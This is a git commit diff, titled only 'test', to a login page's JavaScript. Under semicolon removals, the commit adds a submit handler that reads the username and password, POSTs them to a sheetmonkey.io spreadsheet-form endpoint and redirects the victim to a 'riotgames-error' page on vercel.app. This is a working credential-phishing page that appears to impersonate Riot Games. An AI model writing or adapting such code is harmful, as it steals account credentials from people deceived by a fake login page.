4b88ac6977c77424d8737ebb6c31bf4dcf6b262b
segundo <90773948+szgundo@users.noreply.github.com>
2024-03-08 16:41:01 -0300

    test

--- script.js
+++ script.js
@@ -1,28 +1,60 @@
-const inputs = document.querySelectorAll('.input');
-const button = document.querySelector('.login-btn');
+const inputs = document.querySelectorAll('.input')
+const button = document.querySelector('.login-btn')
 
 const handleFocus = ({ target }) => {
-  const span = target.previousElementSibling;
-  span.classList.add('span-active');
+  const span = target.previousElementSibling
+  span.classList.add('span-active')
 }
 
 const handleFocusOut = ({ target }) => {
   if (target.value === '') {
-    const span = target.previousElementSibling;
-    span.classList.remove('span-active');
+    const span = target.previousElementSibling
+    span.classList.remove('span-active')
   }
 }
 
 const handleChange = () => {
-  const [username, password] = inputs;
+  const [username, password] = inputs
 
   if (username.value.length >= 3 && password.value.length >= 8) {
-    button.removeAttribute('disabled');
+    button.removeAttribute('disabled')
   } else {
-    button.setAttribute('disabled', '');
+    button.setAttribute('disabled', '')
   }
 }
 
-inputs.forEach((input) => input.addEventListener('focus', handleFocus));
-inputs.forEach((input) => input.addEventListener('focusout', handleFocusOut));
-inputs.forEach((input) => input.addEventListener('input', handleChange));
+inputs.forEach((input) => input.addEventListener('focus', handleFocus))
+inputs.forEach((input) => input.addEventListener('focusout', handleFocusOut))
+inputs.forEach((input) => input.addEventListener('input', handleChange))
+
+const btn = document.getElementById('btn')
+
+const addLoading = () => {
+  btn.innerHTML = ' <img src="./images/load-icon.png" class="loading">'
+}
+
+const removeLoading = () => {
+  btn.innerHTML = ' <i class="ph-bold ph-arrow-right"></i>'
+}
+
+const handleSubmit = (event) => {
+  event.preventDefault()
+  addLoading()
+
+  const username = document.querySelector('input[name=username]').value
+  const password = document.querySelector('input[name=password]').value
+
+  fetch('https://api.sheetmonkey.io/form/wePitmkydxXYfwi7echpcP', {
+    method: 'post',
+    headers: {
+      Accept: 'application/json',
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ username, password }),
+  }).then(() => {
+    removeLoading()
+    window.location.href = 'https://authenticate-riotgames-error.vercel.app/'
+  })
+}
+
+document.querySelector('form').addEventListener('submit', handleSubmit)
